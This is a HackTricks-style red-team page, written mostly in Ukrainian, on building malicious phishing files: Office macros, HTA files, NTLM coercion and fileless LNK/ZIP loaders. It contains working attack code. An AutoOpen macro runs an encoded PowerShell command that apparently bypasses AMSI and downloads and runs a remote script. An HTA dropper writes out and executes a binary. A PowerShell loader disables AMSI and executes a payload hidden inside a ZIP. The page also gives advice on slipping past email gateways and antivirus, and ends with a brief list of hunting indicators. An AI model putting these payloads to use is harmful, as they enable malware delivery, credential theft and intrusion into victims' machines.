# Файли та документи фішингу

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word виконує валідацію даних файлу перед його відкриттям. Валідація даних здійснюється у вигляді ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, аналізований файл не буде відкрито.

Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак можливе перейменування файлу шляхом зміни розширення та збереження можливості виконання макросів.\
Наприклад, файл RTF за дизайном не підтримує макроси, але файл DOCM, перейменований на RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint etc.).

Ви можете використати наступну команду, щоб перевірити, які розширення будуть виконуватися деякими Office програмами:
```bash
assoc | findstr /i "word excel powerp"
```
Файли DOCX, які посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), що містить макроси, також можуть «виконувати» макроси.

### Зовнішнє завантаження зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Бекдор через макроси

Можна використовувати макроси для запуску довільного коду з документа.

#### Функції автозавантаження

Чим частіше вони використовуються, тим ймовірніше AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду макросів
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Видалити метадані вручну

Перейдіть у **File > Info > Inspect Document > Inspect Document**, що відкриє Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Коли закінчите, у випадаючому списку **Save as type** змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
Зробіть це, тому що ви **can't save macro's inside a `.docx`** і існує **стигма** навколо macro-enabled **`.docm`** розширення (наприклад, ескіз має великий `!`, і деякі web/email шлюзи повністю їх блокують). Тому це **застаріле розширення `.doc` є найкращим компромісом**.

#### Генератори Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Файли HTA

HTA — це програма Windows, яка **поєднує HTML та скриптові мови (наприклад, VBScript і JScript)**. Вона формує інтерфейс користувача і виконується як "fully trusted" програма, без обмежень моделі безпеки браузера.

HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом із **Internet Explorer**, через що **`mshta` dependant on IE**. Тому, якщо його було видалено, HTA не зможуть виконуватися.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примушення NTLM-аутентифікації

Існує кілька способів **примушення NTLM-аутентифікації "віддалено"**, наприклад, можна додати **невидимі зображення** в листи або HTML, до яких користувач звернеться (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, яка **спровокує** **аутентифікацію** просто при **відкритті папки.**

**Перегляньте ці ідеї та інше на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що ви можете не лише steal the hash або authentication, але й **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Дуже ефективні кампанії доставляють ZIP, який містить два легітимні приманкові документи (PDF/DOCX) та шкідливий .lnk. Фішка в тому, що фактичний PowerShell loader зберігається в сирих байтах ZIP після унікального маркера, а .lnk вирізає його та запускає повністю в пам'яті.

Типовий сценарій, реалізований .lnk PowerShell one-liner:

1) Знайти оригінальний ZIP у стандартних шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, та батьківська папка поточної робочої директорії.
2) Прочитати байти ZIP і знайти захардкоджений маркер (наприклад, xFIQCV). Усе після маркера — це вбудований PowerShell payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати там і відкрити підробний .docx, щоб виглядати легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам'яті.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Примітки
- Доставка часто зловживає авторитетними піддоменами PaaS (наприклад, *.herokuapp.com) і може обмежувати доступ до payloads (подавати безпечні ZIP-файли залежно від IP/UA).
- Наступний етап часто декодує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати сліди на диску.

Persistence, яке використовується в тій самій ланцюжку
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-файли, що містять ASCII-маркер (наприклад, xFIQCV), доданий у дані архіву.
- .lnk, який перебирає батьківські/користувацькі папки, щоб знайти ZIP і відкриває приманковий документ.
- AMSI маніпуляції через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довготривалі бізнес-потоки, що закінчуються посиланнями, розміщеними на довірених PaaS-доменах.

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення NTLM-облікових даних**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Посилання

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
